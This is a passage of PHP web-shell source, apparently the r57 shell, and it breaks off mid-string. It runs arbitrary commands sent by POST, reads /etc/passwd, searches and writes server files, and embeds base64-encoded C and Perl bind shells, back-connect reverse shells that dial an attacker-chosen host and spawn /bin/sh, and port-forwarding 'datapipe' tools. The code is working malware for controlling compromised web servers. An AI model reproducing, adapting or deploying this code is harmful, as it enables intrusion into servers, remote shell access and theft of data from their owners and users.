if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$unix = 0;
if(strlen($dir)&gt;1 && $dir[1]==":") $unix=0; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $unix = 0; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr-&gt;SearchText(0,0);
    $res = $sr-&gt;GetResultFiles();
    $found = $sr-&gt;GetMatchesCount();
    $titles = $sr-&gt;GetTitles();
    $r = "";
    if($found &gt; 0)
    {
      $r .= "&lt;TABLE width=100%&gt;";
      foreach($res as $file=&gt;$v)
      {
        $r .= "&lt;TR&gt;";
        $r .= "&lt;TD colspan=2&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;".ws(3);
        $r .= (!$unix)? str_replace("/","\\",$file) : $file;
        $r .= "&lt;/b&gt;&lt;/font&gt;&lt;/ TD&gt;";
        $r .= "&lt;/TR&gt;";
        foreach($v as $a=&gt;$b)
        {
          $r .= "&lt;TR&gt;";
          $r .= "&lt;TD align=center&gt;&lt;B&gt;&lt;font face=tahoma size=-2&gt;".$a."&lt;/font&gt;&lt;/B&gt;&lt;/TD&gt;";
          $r .= "&lt;TD&gt;&lt;font face=tahoma size=-2&gt;".ws(2).$b."&lt;/font&gt;&lt;/TD&gt;";
          $r .= "&lt;/TR&gt;\n";
        }
      }
      $r .= "&lt;/TABLE&gt;";
    echo $r;
    }
    else
    {
      echo "&lt;P align=center&gt;&lt;B&gt;&lt;font face=tahoma size=-2&gt;".$lang[$language.'_text56']."&lt;/B&gt;&lt;/font&gt;&lt;/P&gt;";
    }
  echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
  die();
  }
if(!$safe_mode && strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function get_users()
{
  $users = array();
  $rows=file('/etc/passwd');
  if(!$rows) return 0;
  foreach ($rows as $string)
   {
           $user = @explode(":",$string);
           if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users;
}
function err($n,$txt='')
{
echo '&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;font color=red face=tahoma size=-2&gt;&lt;div align=center&gt;&lt;b&gt;';
echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];
if(!empty($txt)) { echo " $txt"; }
echo '&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
return null;
}
function perms($mode)
{
if (!$GLOBALS['unix']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value,$checked=0)
{
 $ret = "&lt;input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\"";
 if($checked) $ret .= " checked";
 return $ret."&gt;";
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or err(0);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "&lt;tr class=tr1&gt;&lt;td class=td1 width=".$l."% align=right&gt;".$t1."&lt;/td&gt;&lt;td class=td1 align=left&gt;".$t2."&lt;/td&gt;&lt;/tr&gt;";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this-&gt;FilesToSearch = Array();
      for($a=0;$a&lt;count($dirs);$a++)
        $this-&gt;FilesToSearch = @array_merge($this-&gt;FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this-&gt;text = $text;
      $this-&gt;FilesTotal = @count($this-&gt;FilesToSearch);
      $this-&gt;TimeStart = getmicrotime();
      $this-&gt;MatchesCount = 0;
      $this-&gt;ResultFiles = Array();
      $this-&gt;FileMatchesCount = Array();
      $this-&gt;titles = Array();
    }
    function GetFilesTotal() { return $this-&gt;FilesTotal; }
    function GetTitles() { return $this-&gt;titles; }
    function GetTimeTotal() { return $this-&gt;TimeTotal; }
    function GetMatchesCount() { return $this-&gt;MatchesCount; }
    function GetFileMatchesCount() { return $this-&gt;FileMatchesCount; }
    function GetResultFiles() { return $this-&gt;ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this-&gt;text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=&gt;$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this-&gt;FilesToSearch as $k=&gt;$filename)
      {
        $this-&gt;FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a&lt;@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"&lt;SPAN style='color: #990000;'&gt;&lt;b&gt;\\1&lt;/b&gt;&lt;/SPAN&gt;",$CurString);
            $this-&gt;ResultFiles[$filename][$a+1] = $CurString;
            $this-&gt;MatchesCount += $count;
            $this-&gt;FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this-&gt;TimeTotal = @round(getmicrotime() - $this-&gt;TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
